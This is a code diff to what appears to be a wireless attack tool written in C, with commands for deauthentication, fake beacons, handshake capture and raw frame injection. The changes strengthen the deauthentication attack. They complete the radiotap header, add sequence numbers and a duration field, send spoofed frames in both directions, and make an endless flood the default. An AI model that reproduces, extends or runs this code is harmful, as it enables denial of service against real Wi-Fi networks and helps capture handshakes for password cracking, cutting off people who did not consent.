@@ -50,16 +50,23 @@ int build_deauth_frame(uint8_t *buf, const uint8_t *bssid, const uint8_t *statio
 {
     int off = 0;
     memset(buf, 0, HACKIT_RADIOTAP_LEN + 26);
+    buf[0] = 0x00; buf[1] = 0x00;
     buf[2] = HACKIT_RADIOTAP_LEN;
+    buf[3] = 0x00;
+    buf[4] = 0x02; buf[5] = 0x00; buf[6] = 0x00; buf[7] = 0x00;
+    buf[8] = 0x00;
     off += HACKIT_RADIOTAP_LEN;
     buf[off] = 0xC0; buf[off + 1] = 0x00;
     off += 2;
-    buf[off] = 0x00; buf[off + 1] = 0x00;
+    buf[off] = 0x01; buf[off + 1] = 0x3A;
     off += 2;
     memcpy(&buf[off], station, 6); off += 6;
     memcpy(&buf[off], bssid, 6); off += 6;
     memcpy(&buf[off], bssid, 6); off += 6;
-    buf[off] = 0x00; buf[off + 1] = 0x00;
+    static uint16_t seq = 0;
+    seq = (seq + 1) & 0xFFF;
+    buf[off] = (uint8_t)((seq << 4) & 0xFF);
+    buf[off + 1] = (uint8_t)((seq << 4) >> 8);
     off += 2;
     buf[off] = reason & 0xFF; buf[off + 1] = (reason >> 8) & 0xFF;
     return off + 2;
@@ -106,21 +113,36 @@ int send_deauth(const char *iface, const char *bssid, const char *station, int c
     int fd = open_raw_socket(iface);
     if (fd < 0) return -1;
     uint8_t frame[MAX_FRAME_SIZE];
-    int len = build_deauth_frame(frame, bmac, sta, 7);
     struct sockaddr_ll dest;
     memset(&dest, 0, sizeof(dest));
     dest.sll_family = AF_PACKET;
+    int targeted = memcmp(sta, broadcast, 6) != 0;
     int sent = 0;
-    for (int i = 0; i < count; i++) {
-        frame[HACKIT_RADIOTAP_LEN + 22] = (i & 0x0F) << 4;
-        frame[HACKIT_RADIOTAP_LEN + 23] = (i >> 4) & 0xFF;
-        ssize_t n = sendto(fd, frame, len, 0, (struct sockaddr *)&dest, sizeof(dest));
-        if (n == len) sent++;
-        else fprintf(stderr, "deauth frame %d failed: %s\n", i + 1, strerror(errno));
-        usleep(10000);
+    if (count < 1) {
+        while (1) {
+            int len = build_deauth_frame(frame, bmac, sta, 7);
+            ssize_t n = sendto(fd, frame, len, 0, (struct sockaddr *)&dest, sizeof(dest));
+            if (n == len) sent++;
+            if (targeted) {
+                len = build_deauth_frame(frame, sta, bmac, 7);
+                n = sendto(fd, frame, len, 0, (struct sockaddr *)&dest, sizeof(dest));
+                if (n == len) sent++;
+            }
+        }
+    } else {
+        for (int i = 0; i < count; i++) {
+            int len = build_deauth_frame(frame, bmac, sta, 7);
+            ssize_t n = sendto(fd, frame, len, 0, (struct sockaddr *)&dest, sizeof(dest));
+            if (n == len) sent++;
+            if (targeted) {
+                len = build_deauth_frame(frame, sta, bmac, 7);
+                n = sendto(fd, frame, len, 0, (struct sockaddr *)&dest, sizeof(dest));
+                if (n == len) sent++;
+            }
+        }
     }
     close(fd);
-    printf("[DEAUTH] Sent %d/%d deauth frames on %s\n", sent, count, iface);
+    fprintf(stderr, "[DEAUTH] Sent %d frames on %s -> %s\n", sent, iface, bssid);
     return sent;
 }
 
@@ -223,7 +245,7 @@ int inject_frame(const char *iface, const uint8_t *frame, int len)
 static void print_usage(const char *prog)
 {
     fprintf(stderr, "Usage: %s <command> [args]\n", prog);
-    fprintf(stderr, "  deauth <iface> <bssid> [station] [count]\n");
+    fprintf(stderr, "  deauth <iface> <bssid> [station] [count=0=infinite]\n");
     fprintf(stderr, "  beacon <iface> <ssid> [count]\n");
     fprintf(stderr, "  handshake <iface> <bssid> <timeout> <output>\n");
     fprintf(stderr, "  inject <iface> <hexdata>\n");
@@ -238,8 +260,7 @@ int main(int argc, char **argv)
         if (argc < 4) { print_usage(argv[0]); return 1; }
         const char *bssid = argv[3];
         const char *station = argc > 4 ? argv[4] : NULL;
-        int count = argc > 5 ? atoi(argv[5]) : 5;
-        if (count < 1) count = 5;
+        int count = argc > 5 ? atoi(argv[5]) : 0;
         return send_deauth(iface, bssid, station, count) > 0 ? 0 : 1;
     } else if (strcmp(cmd, "beacon") == 0) {
         if (argc < 4) { print_usage(argv[0]); return 1; }
